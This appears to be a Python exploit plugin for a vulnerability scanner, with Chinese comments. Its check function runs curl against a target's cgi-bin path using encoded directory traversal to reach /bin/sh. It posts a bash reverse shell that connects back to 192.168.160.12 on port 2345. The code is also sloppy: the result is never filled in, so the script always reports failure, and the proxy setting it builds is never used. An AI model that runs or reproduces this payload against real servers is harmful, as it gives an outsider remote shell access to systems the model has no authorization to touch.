import subprocess
import re


def check(url, proxies):
    if proxies:
        proxies = {proxies['protocol']: proxies['protocol'] + '://' + proxies['ip'] + ':' + str(proxies['port'])}
    try:
        ret = {'success': False, 'response': [], 'requests': [], 'error': [], 'info': []}
        popen3 = subprocess.Popen([
            'curl', '--data','echo;bash -i>& /dev/tcp/192.168.160.12/2345 0>1&', f'{url}cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'],stdout=subprocess.PIPE)
        data=popen3.stdout.read()
    except Exception as e:
        print(e)
    return ret


def main(params):
    result = params.get('result', {})
    url = params.get('url', '')
    headers = params.get('headers', {})
    proxies = params.get('proxies', None)  # 代理
    timeout = params.get('timeout', 5)  # 超时时间
    result = check(url, proxies)
    return result


if __name__ == '__main__':
    params = {
        'result': {'success': False, 'response': [], 'requests': [], 'error': []},
        # headers：传入的header参数
        'headers': {},
        # proxy：传入的代理服务器参数
        'proxies': {'protocol': 'http', 'ip': '127.0.0.1', 'port': 8080},
        'timeout': 30,
        ###可选参数###
        'url': "http://172.20.20.138/",
    }
    print(main(params))
